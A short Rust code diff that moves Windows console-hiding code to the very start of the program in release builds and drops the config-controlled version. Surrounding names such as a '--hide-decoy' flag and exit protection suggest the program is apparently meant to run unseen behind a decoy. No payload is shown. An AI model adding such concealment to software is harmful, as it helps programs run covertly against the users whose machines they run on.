@@ -201,6 +201,17 @@ fn setup_exit_protection() -> bool {
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
+    // Hide console IMMEDIATELY at startup (before any other code runs)
+    #[cfg(not(debug_assertions))]
+    {
+        unsafe {
+            let console = winapi::um::wincon::GetConsoleWindow();
+            if !console.is_null() {
+                winapi::um::winuser::ShowWindow(console, winapi::um::winuser::SW_HIDE);
+            }
+        }
+    }
+
     let args: Vec<String> = env::args().collect();
     let hide_decoy_flag = args.contains(&"--hide-decoy".to_string());
 
@@ -344,16 +355,6 @@ async fn main() -> anyhow::Result<()> {
             std::thread::sleep(std::time::Duration::from_secs(2));
         }
         safe_exit(0);
-    }
-
-    //@ Hide Console
-    if !Config::SHOW_CONSOLE {
-        unsafe {
-            let console = winapi::um::wincon::GetConsoleWindow();
-            if !console.is_null() {
-                winapi::um::winuser::ShowWindow(console, winapi::um::winuser::SW_HIDE);
-            }
-        }
     }
 
     //@ Initialize
